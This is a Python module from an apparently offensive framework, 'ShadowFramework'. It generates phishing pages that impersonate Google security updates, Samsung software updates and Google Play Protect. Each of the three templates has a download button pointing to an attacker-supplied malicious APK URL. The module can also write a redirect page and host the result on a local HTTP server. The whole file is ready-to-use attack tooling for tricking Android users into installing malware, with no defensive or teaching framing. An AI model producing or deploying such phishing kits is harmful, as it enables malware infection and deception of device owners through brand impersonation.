"""
ShadowFramework — App Downloader Phish
Generates realistic phishing HTML pages mimicking Google Play, Samsung, or system update dialogs.
"""
import os
import hashlib
from pathlib import Path
from rich.console import Console
from utils.logger import log_action

console = Console()

TEMPLATES = {
    'google': {
        'title': 'Google Security Update',
        'color': '#4285f4',
        'accent': '#34a853',
        'html': '''<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Google Security Update</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:'Google Sans',Roboto,sans-serif;background:#f8f9fa;min-height:100vh;display:flex;align-items:center;justify-content:center}}
.container{{background:white;border-radius:28px;padding:40px;max-width:400px;width:92%;box-shadow:0 1px 3px rgba(0,0,0,.12)}}
.logo{{text-align:center;margin-bottom:24px}}.logo svg{{width:75px}}.logo h1{{font-size:24px;color:#202124;margin-top:12px;font-weight:400}}
.alert{{background:#fce8e6;border-radius:12px;padding:16px;margin:16px 0;display:flex;align-items:start;gap:12px}}
.alert .icon{{color:#d93025;font-size:24px;flex-shrink:0}}.alert p{{color:#5f6368;font-size:14px;line-height:1.5}}
.info{{color:#5f6368;font-size:14px;margin:20px 0;line-height:1.6}}
.btn{{display:block;width:100%;padding:14px;background:#1a73e8;color:white;border:none;border-radius:100px;font-size:15px;font-weight:500;cursor:pointer;text-align:center;text-decoration:none;margin-top:20px}}
.btn:hover{{background:#1557b0}}.skip{{text-align:center;margin-top:16px}}.skip a{{color:#1a73e8;font-size:14px;text-decoration:none}}
.footer{{text-align:center;margin-top:24px;color:#80868b;font-size:12px}}
</style></head><body>
<div class="container">
<div class="logo"><svg viewBox="0 0 24 24"><path fill="#4285f4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 01-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34a853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#fbbc05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#ea4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
<h1>Security Update Required</h1></div>
<div class="alert"><span class="icon">⚠️</span><p>Your device is missing a <strong>critical security patch</strong> (March 2026). Install now to protect your data.</p></div>
<div class="info">This update includes:<br>• Security vulnerability fixes<br>• Performance improvements<br>• Privacy protection updates</div>
<a href="{payload_url}" class="btn" download>Download &amp; Install</a>
<div class="skip"><a href="#">Remind me later</a></div>
<div class="footer">Google LLC &bull; Privacy &bull; Terms</div>
</div></body></html>''',
    },
    'samsung': {
        'title': 'Samsung Software Update',
        'color': '#1428a0',
        'accent': '#0077c8',
        'html': '''<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Software Update</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:'SamsungOne',sans-serif;background:#f7f7f7;min-height:100vh}}
.header{{background:#1428a0;color:white;padding:20px 24px;font-size:20px;font-weight:300}}
.content{{padding:24px}}.card{{background:white;border-radius:16px;padding:24px;margin-bottom:16px;box-shadow:0 1px 2px rgba(0,0,0,.08)}}
.version{{font-size:28px;color:#1428a0;font-weight:600;margin-bottom:4px}}.date{{color:#999;font-size:14px}}
.changelog{{margin:16px 0;color:#333;font-size:14px;line-height:1.8}}
.size{{display:flex;justify-content:space-between;color:#666;font-size:14px;padding:12px 0;border-top:1px solid #eee}}
.btn{{display:block;width:100%;padding:16px;background:#1428a0;color:white;border:none;border-radius:100px;font-size:16px;cursor:pointer;text-align:center;text-decoration:none;margin-top:16px}}
</style></head><body>
<div class="header">Software update</div>
<div class="content">
<div class="card">
<div class="version">One UI 7.1</div>
<div class="date">March 2026 Security Patch</div>
<div class="changelog">• Security patch level: 2026-03-01<br>• Fixed critical Bluetooth vulnerability<br>• Camera stability improvements<br>• Battery optimization updates</div>
<div class="size"><span>Download size</span><span>247.3 MB</span></div>
<a href="{payload_url}" class="btn" download>Download and install</a>
</div>
</div></body></html>''',
    },
    'play': {
        'title': 'Google Play Update',
        'color': '#01875f',
        'accent': '#01875f',
        'html': '''<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>App Update Available</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:Roboto,sans-serif;background:#f1f3f4}}
.header{{background:white;padding:16px 20px;display:flex;align-items:center;gap:12px;box-shadow:0 1px 2px rgba(0,0,0,.1)}}
.header h1{{font-size:18px;color:#202124;font-weight:500}}
.app{{display:flex;padding:20px;background:white;margin:12px;border-radius:12px;gap:16px;align-items:center}}
.icon{{width:64px;height:64px;background:linear-gradient(135deg,#01875f,#34a853);border-radius:16px;display:flex;align-items:center;justify-content:center;color:white;font-size:28px}}
.info h2{{font-size:16px;color:#202124;margin-bottom:4px}}.info p{{color:#5f6368;font-size:13px}}
.details{{padding:0 20px;margin:12px;background:white;border-radius:12px}}
.detail-row{{padding:16px 0;display:flex;justify-content:space-between;border-bottom:1px solid #f1f3f4;font-size:14px;color:#5f6368}}
.btn{{display:block;margin:20px;padding:14px;background:#01875f;color:white;border:none;border-radius:8px;font-size:15px;cursor:pointer;text-align:center;text-decoration:none}}
</style></head><body>
<div class="header"><span style="font-size:24px">▶</span><h1>Google Play</h1></div>
<div class="app"><div class="icon">🛡️</div><div class="info"><h2>Google Play Protect</h2><p>Google LLC &bull; Security</p></div></div>
<div class="details">
<div class="detail-row"><span>Version</span><span>38.2.21-29</span></div>
<div class="detail-row"><span>Size</span><span>12.4 MB</span></div>
<div class="detail-row"><span>Updated</span><span>March 10, 2026</span></div>
</div>
<a href="{payload_url}" class="btn" download>Update</a>
</body></html>''',
    },
}


class Module:
    MODULE_INFO = {
        'name': 'post/android/app_downloader_phish',
        'description': 'Generates realistic phishing pages mimicking Google, Samsung, or Play Store update dialogs.',
        'options': {
            'PAYLOAD_URL': 'URL to malicious APK [default: payload.apk]',
            'TEMPLATE':    'Template: google, samsung, play [default: google]',
            'OUTPUT_DIR':  'Output directory [default: www/templates]',
            'SERVE':       'Start HTTP server to host the page [default: false]',
            'PORT':        'HTTP server port [default: 8080]',
        }
    }

    def __init__(self, framework):
        self.framework = framework

    def run(self):
        payload_url = self.framework.options.get('PAYLOAD_URL', 'payload.apk')
        template = self.framework.options.get('TEMPLATE', 'google').lower()
        output_dir = self.framework.options.get('OUTPUT_DIR', 'www/templates')
        serve = self.framework.options.get('SERVE', 'false').lower() == 'true'
        port = int(self.framework.options.get('PORT', '8080'))

        if template not in TEMPLATES:
            console.print(f"[red][!] Unknown template: {template}. Use: google, samsung, play[/red]")
            return

        tpl = TEMPLATES[template]
        console.print(f"[cyan][*] Generating '{tpl['title']}' phishing page...[/cyan]")
        log_action(f"Phishing page generation: {template}")

        html = tpl['html'].format(payload_url=payload_url)

        out_dir = Path(output_dir)
        out_dir.mkdir(parents=True, exist_ok=True)
        out_file = out_dir / f'{template}_update.html'
        out_file.write_text(html)
        console.print(f"[green][+] Saved: {out_file}[/green]")

        # Also generate an index that redirects
        index = out_dir / 'index.html'
        index.write_text(f'<meta http-equiv="refresh" content="0;url={template}_update.html">')

        if serve:
            import subprocess
            console.print(f"[yellow][*] Starting HTTP server on :{port}...[/yellow]")
            console.print(f"[dim]  URL: http://0.0.0.0:{port}/{template}_update.html[/dim]")
            try:
                subprocess.run(['python3', '-m', 'http.server', str(port)], cwd=str(out_dir))
            except KeyboardInterrupt:
                console.print("\n[yellow][*] Server stopped.[/yellow]")
        else:
            console.print(f"\n[dim]Serve with: cd {out_dir} && python3 -m http.server {port}[/dim]")

        console.print(f"[bold green][+] Phishing page ready.[/bold green]")
